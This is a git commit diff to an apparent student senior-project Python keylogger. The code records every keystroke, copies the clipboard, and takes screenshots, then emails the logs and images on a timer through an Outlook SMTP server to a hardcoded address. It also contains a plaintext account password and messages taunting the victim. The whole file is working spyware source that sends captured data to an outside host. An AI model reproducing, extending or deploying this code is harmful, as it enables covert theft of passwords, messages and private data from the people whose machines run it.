af86f26d90de7b2111021f6826c171e35f4c2377
HighL1ghter <113138242+HighL1ghter@users.noreply.github.com>
2022-12-05 08:40:39 -0500

    Update KeystrokeLogger.py

--- SeniorProject/KeyLogger/KeystrokeLogger.py
+++ SeniorProject/KeyLogger/KeystrokeLogger.py
@@ -1,6 +1,14 @@
 import getpass
 import smtplib
 import time
+
+# We want to add these imports in case we want to record the user's screen and send it over in video format
+import numpy as np
+import pyautogui
+
+
+from email import encoders
+import win32clipboard
 from pynput.keyboard import Key, Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -11,105 +19,148 @@ print(
     "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
     "MINE. \nEnjoy using this computer while you still can!")
 
-# send the information to an email
-email = "csproject432@outlook.com"
-password = "s1339490"
-server = smtplib.SMTP('smtp.office365.com', 587)
-server.starttls()
-server.login(email, password)
+# Key information will be stored here
+keys_information = "key_log.txt"
 
-# logger
-full_log = ''
-word = ''
+# Our clipboard information will be stored here
+clipboard_information = "clipboard.txt"
 
-# whenever we reach this character limit, it will send us the log of what the user has typed in
-char_limit = 150
+# Our screenshot information will be stored here
+screenshot_information = "screenshot.png"
 
-# The email where we will send what we collect
-to_address = ' '
+# Video file format we will be saving
+video_information = "recording.avi"
 
-# How our keys will be stored
-keys_info = "key_log.txt"
-keys_info_e = "e_key_log.txt"
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_systeminfo.txt"
+clipboard_information_e = "e_clipboard.txt"
 
-#How our screenshot will be stored
-screenshot_info = "image.png"
-
-file_path = " "
-extend = "\\"
-
-# Used for time
 time_iteration = 15
 number_of_iterations_end = 3
 
-"""
-def on_press(key):
-    global word
-    global full_log
-    global email
-    global char_limit
-"""
+email_address = "csproject432@outlook.com"  # Enter disposable email here
+password = "s1339490"  # Enter email password here
 
+username = getpass.getuser()
 
-def send_log(filename, attachment, to_address):
-    from_address = email
+toaddr = "csproject432@outlook.com"  # Enter the email address you want to send your information to
+
+file_path = "C:\\Users\\skyle\\SeniorProjects\\Custom Keylogger\\KeystrokeLogger\\pythonProject"  # Enter the file path you want your files to be saved to
+extend = "\\"
+file_merge = file_path + extend
+
+# Code for recording our screen
+# Screen resolution
+SCREEN_SIZE = tuple(pyautogui.size())
+
+#fourcc = cv2.VideoWriter_fourcc(*"XVID")
+
+# Frames per second
+fps = 30.0
+
+#out = cv2.VideoWriter(video_information, fourcc, fps, SCREEN_SIZE)
+
+vid_time = time_iteration
+
+# email controls
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
     msg = MIMEMultipart()
-    msg['From'] = from_address
-    msg['To'] = to_address
-    msg['Subject'] = "Log file"
-    body = "Body_of_the_email"
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
     msg.attach(MIMEText(body, 'plain'))
+
     filename = filename
     attachment = open(attachment, 'rb')
+
     p = MIMEBase('application', 'octet-stream')
+
     p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
     msg.attach(p)
-    server.starttls()
-    server.login(from_address, password)
+
+    s = smtplib.SMTP('smtp.outlook.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
     text = msg.as_string()
-    server.sendmail(from_address, to_address, text)
-    print("Your logs are now sent. Thanks chump.")
-    server.quit()
-    # server.sendmail(email, email, full_log)
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
 
 
-send_log(keys_info, file_path + extend + keys_info, to_address)
+send_email(keys_information, file_path + extend + keys_information, toaddr)
 
-#Used for getting screenshots optional add-on for our keylogger
+
+# get the clipboard contents
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+
+copy_clipboard()
+
+
+# get screenshots
 def screenshot():
-    image = ImageGrab.grab()
-    image.save(file_path + extend + screenshot_info)
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
 
 screenshot()
 
-
 number_of_iterations = 0
-current_time = time.time()
-stopping_time = time.time() + time_iteration
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
 
 # Timer for keylogger
 while number_of_iterations < number_of_iterations_end:
+
     count = 0
     keys = []
 
 
     def on_press(key):
-        global keys, count
+        global keys, count, currentTime
+
         print(key)
         keys.append(key)
         count += 1
+        currentTime = time.time()
 
-        if (count >= 1):
+        if count >= 1:
             count = 0
             write_file(keys)
             keys = []
 
 
     def write_file(keys):
-        with open(file_path + extend + keys_info, "a") as f:
-            for i in keys:
-                k = str(i).replace("'", "")
+        with open(file_path + extend + keys_information, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
                 if k.find("space") > 0:
                     f.write('\n')
                     f.close()
@@ -121,21 +172,27 @@ while number_of_iterations < number_of_iterations_end:
     def on_release(key):
         if key == Key.esc:
             return False
-        if (current_time > stopping_time):
+        if currentTime > stoppingTime:
             return False
 
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-    if (current_time > stopping_time):
-        with open(file_path + extend + keys_info, "w") as f:
+    if currentTime > stoppingTime:
+        with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
-            send_log(screenshot_info, file_path + extend + screenshot_info, to_address)
-            number_of_iterations += 1
 
-            current_time = time.time()
-            stopping_time = time.time() + time_iteration
+        screenshot()
+        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
+
 """
 We need to rewrite the keystroke getter
     while len(full_log) < char_limit:
